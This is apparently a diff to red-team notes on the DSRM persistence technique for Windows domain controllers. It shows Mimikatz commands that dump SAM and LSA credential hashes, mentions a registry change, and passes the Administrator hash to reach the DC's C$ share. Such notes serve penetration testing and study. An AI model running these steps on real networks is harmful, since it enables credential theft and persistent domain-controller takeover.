@@ -4,7 +4,11 @@ Directory Services Restore Mode (DSRM) is a Safe Mode boot option for Windows Se
 \
 Every Domain controller has local administrator account called "Administrator" and his password is the DSRM password.
 
+DSRM Password (SafeModePassword) is required when a server is promoted to DC and it is rarely changed
 
+After altering the config on DC, it is possible to pass the NTLM hash of the this user to access the DC.
+
+There are policies in the orgs saying krbtgt password/hash to be rotated after a specified time frame, but most of the orgs don't have any policy on rotating the password/hash for this "Local Admin on the DC I.e, DSRM Password"
 
 ## Dump DSRM NTLM hash
 
@@ -22,11 +26,9 @@ Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
 ```
 
-
-
 ## Change Logon Behavior
 
-In order to use DSRM account hash we need to change his registry key
+In order to use DSRM account hash we need to change these registry key
 
 ```powershell
 # Entering DC session
@@ -54,4 +56,3 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator
 # Check if worked
 ls \\dcorp-dc\C$
 ```
-
